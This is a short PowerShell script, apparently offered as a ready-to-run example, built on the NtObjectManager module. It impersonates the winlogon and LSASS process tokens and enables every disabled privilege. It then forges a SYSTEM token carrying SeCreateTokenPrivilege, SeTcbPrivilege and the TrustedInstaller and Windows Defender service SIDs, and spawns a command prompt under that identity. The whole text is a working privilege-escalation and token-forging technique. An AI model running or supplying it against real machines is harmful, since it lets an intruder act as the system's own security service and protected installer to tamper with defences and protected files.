# quick example to spawn cmd prompt with crafted toking, including Trusted Installer and Windows Defender Service SID in the TokenGroups
# using NtObjectManager module

$winDefendSid = Get-NtSid -ServiceName "WinDefend"
$trustedInstallerSid = Get-NtSid -ServiceName "TrustedInstaller"

# get winlogon pid
$winLogonPid = (get-process winlogon).id

# get winlogon token
$winLogonToken = Get-NtTokenFromProcess $winLogonPid

# impersonate winlogon
$current = Get-NtThread -Current -PseudoHandle
$contextWinLogon = $current.Impersonate($winLogonToken)

$disabledPrivileges = Get-NtTokenPrivilege | where {-not $_.Enabled } | select -Expand Name
ForEach ($priv in $disabledPrivileges)
{
	Enable-NtTokenPrivilege -Privilege $priv -Token $winLogonToken
}

# get lsass pid
$lsasPid = (Get-Process LSASS).Id

# get lsas token
$lsasToken = Get-NtTokenFromProcess $lsasPid

# impersonate lsas
$contextLsas = $current.Impersonate($lsasToken)

$disabledPrivileges = Get-NtTokenPrivilege | where {-not $_.Enabled } | select -Expand Name
ForEach ($priv in $disabledPrivileges)
{
	Enable-NtTokenPrivilege -Privilege $priv
}

$token = New-NtToken -User SY -TokenType Primary -Access MaximumAllowed -Privileges SeCreateGlobalPrivilege,SeTrustedCredManAccessPrivilege,SeTakeOwnershipPrivilege,SeLoadDriverPrivilege,SeSecurityPrivilege,SeIncreaseQuotaPrivilege,SeAssignPrimaryTokenPrivilege,SeDebugPrivilege,SeImpersonatePrivilege,SeCreateTokenPrivilege,SeTcbPrivilege -Groups $trustedInstallerSid.ToString(),$winDefendSid.ToString(), BA, WD, S-1-5-32-545,S-1-5-6,S-1-5-15,S-1-5-11,S-1-5-80-1523878533-411328482-2798077809-3098663872-2604013308
$dupToken = Copy-NtToken -Token $token -ImpersonationLevel Impersonation -Access MaximumAllowed

New-Win32Process -CommandLine "cmd.exe /k echo **WINDOWS DEFENDER COMMAND PROMPT** && whoami /groups" -Token $dupToken

#revert
$contextLsas.Revert()
$contextLsas.Dispose()
$contextWinLogon.Revert()
$contextWinLogon.Dispose()

